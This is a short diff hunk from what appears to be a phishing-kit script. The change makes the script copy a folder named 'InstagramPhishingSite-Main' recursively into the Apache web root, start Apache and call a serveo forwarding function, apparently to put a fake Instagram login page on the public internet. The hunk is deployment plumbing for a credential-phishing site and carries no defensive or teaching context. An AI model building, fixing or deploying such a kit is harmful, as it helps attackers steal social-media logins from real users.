@@ -49,7 +49,7 @@ def main():  # Main script #
 
     if choice == "1":
         print(green + '[+] Copying Files')
-        os.system('cp ' + cwd  + '/insta' " /var/www/html/")
+        os.system('cp ' +'-r '+ cwd  + '/InstagramPhishingSite-Main' " /var/www/html/")
         print(green + '[+] Starting Apache2 Service')
         os.system('service apache2 start')
         serveo_forward()
